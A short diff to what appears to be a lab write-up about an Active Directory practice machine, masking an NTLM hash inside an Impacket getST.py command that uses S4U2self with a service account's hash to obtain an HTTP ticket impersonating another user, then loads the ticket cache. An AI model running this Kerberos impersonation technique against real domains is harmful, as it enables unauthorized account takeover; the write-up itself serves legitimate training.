@@ -346,7 +346,7 @@ We can see that :
 We can try to create HTTP STs for other users using the ShareSvc credentials we have using S4U2SELF :
 
 ```bash
-getST.py -spn 'HTTP/lus2dc.lustrous2.vl' -dc-ip 'lus2dc.lustrous2.vl' "lustrous2.vl"/"ShareSvc" -hashes :'CA345B5B5E85A8D468FCFBA9F4F8D460' -self -impersonate 'Ryan.Davies' -debug -altservice 'HTTP/lus2dc.lustrous2.vl'
+getST.py -spn 'HTTP/lus2dc.lustrous2.vl' -dc-ip 'lus2dc.lustrous2.vl' "lustrous2.vl"/"ShareSvc" -hashes :'CA[...]60' -self -impersonate 'Ryan.Davies' -debug -altservice 'HTTP/lus2dc.lustrous2.vl'
 
 export KRB5CCNAME=Ryan.Davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
 
